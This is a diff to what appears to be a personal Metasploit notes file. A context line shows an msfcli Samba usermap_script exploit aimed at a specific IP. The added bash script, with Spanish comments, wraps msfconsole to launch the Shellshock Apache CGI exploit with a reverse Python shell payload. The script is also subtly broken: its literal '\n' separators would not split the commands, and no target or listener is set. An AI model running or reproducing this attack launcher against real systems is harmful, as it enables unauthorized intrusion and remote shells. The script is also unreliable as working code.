@@ -21,3 +21,42 @@ msfcli exploit/multi/samba/usermap_script RHOST=172.16.194.172 PAYLOAD=cmd/unix/
 sudo apt update && sudo apt-get install -y postgresql postgresql-client
 
 sudo service postgresql start && sudo update-rc.d postgresql enable
+
+# metasploit
+
+#!/bin/bash
+
+# Comando para ejecutar Metasploit
+MSFCONSOLE=/usr/bin/msfconsole
+
+# Verificar si Metasploit está instalado
+if [ ! -x "$MSFCONSOLE" ]; then
+    echo "Metasploit no está instalado. Por favor, instálalo antes de ejecutar este script."
+    exit 1
+fi
+
+# Función para ejecutar comandos de Metasploit
+function ejecutar_comando_msf() {
+    comando=$1
+    $MSFCONSOLE -q -x "$comando; exit" # Ejecuta el comando y luego sale de Metasploit
+}
+
+# Comando para crear un exploit
+function crear_exploit() {
+    nombre=$1
+    payload=$2
+
+    comando="use exploit/$nombre"
+    comando+="\nset payload $payload"
+    comando+="\nexploit"
+
+    ejecutar_comando_msf "$comando"
+}
+
+# Ejemplo de uso
+crear_exploit "multi/http/apache_mod_cgi_bash_env_exec" "cmd/unix/reverse_python"
+
+# Puedes añadir más funciones y comandos según tus necesidades
+
+# Fin del script
+
